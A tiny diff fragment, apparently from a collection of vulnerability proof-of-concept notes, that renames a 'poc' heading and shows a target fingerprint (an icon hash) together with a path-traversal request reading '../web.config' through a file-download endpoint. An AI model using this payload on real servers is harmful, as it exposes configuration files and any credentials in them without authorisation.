@@ -9,7 +9,7 @@
 icon_hash="-227059202"
 ```
 
-## poc
+## POC
 
 ```
 /Download/DownFile?fileName=../web.config
